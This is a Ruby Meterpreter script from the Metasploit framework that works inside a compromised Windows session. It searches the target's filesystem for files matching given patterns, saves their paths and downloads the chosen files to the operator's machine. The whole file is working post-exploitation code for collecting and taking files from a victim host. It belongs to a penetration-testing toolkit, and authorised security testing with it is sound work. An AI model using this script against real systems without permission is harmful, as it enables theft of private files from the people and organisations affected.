##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
##


# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
@client = client
location = nil
search_blob = []
input_file = nil
output_file = nil
recurse = false
logs = nil
@opts = Rex::Parser::Arguments.new(
  "-h" => [false, "Help menu." ],
  "-i" => [true, "Input file with list of files to download, one per line."],
  "-d" => [true, "Directory to start search on, search will be recursive."],
  "-f" => [true, "Search blobs separated by a |."],
  "-o" => [true, "Output File to save the full path of files found."],
  "-r" => [false, "Search subdirectories."],
  "-l" => [true, "Location where to save the files."]
)
# Function for displaying help message
def usage
  print_line "Meterpreter Script for searching and downloading files that"
  print_line "match a specific pattern. First save files to a file, edit and"
  print_line("use that same file to download the choosen files.")
  print_line(@opts.usage)
  raise Rex::Script::Completed
end

# Check that we are running under the right type of Meterpreter
if client.platform == 'windows'
  # Parse the options
  if args.length > 0
    @opts.parse(args) { |opt, idx, val|
      case opt
      when "-h"
        usage
      when "-i"
        input_file = val
      when "-o"
        output_file = val
      when "-d"
        location = val
      when "-f"
        search_blob = val.split("|")
      when "-r"
        recurse = true
      when "-l"
        logs = val
      end
    }
    # Search for files and save their location if specified
    if search_blob.length > 0 and location
      search_blob.each do |s|
        print_status("Searching for #{s}")
        results = @client.fs.file.search(location,s,recurse)
        results.each do |file|
          print_status("\t#{file['path']}\\#{file['name']} (#{file['size']} bytes)")
          file_local_write(output_file,"#{file['path']}\\#{file['name']}") if output_file
        end
      end
    end
    # Read log file and download those files found
    if input_file and logs
      if ::File.exist?(input_file)
        print_status("Reading file #{input_file}")
        print_status("Downloading to #{logs}")
        ::File.open(input_file, "r").each_line do |line|
          print_status("\tDownloading #{line.chomp}")
          @client.fs.file.download(logs, line.chomp)
        end
      else
        print_error("File #{input_file} does not exist!")
      end
    end
  else
    usage
  end
else
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
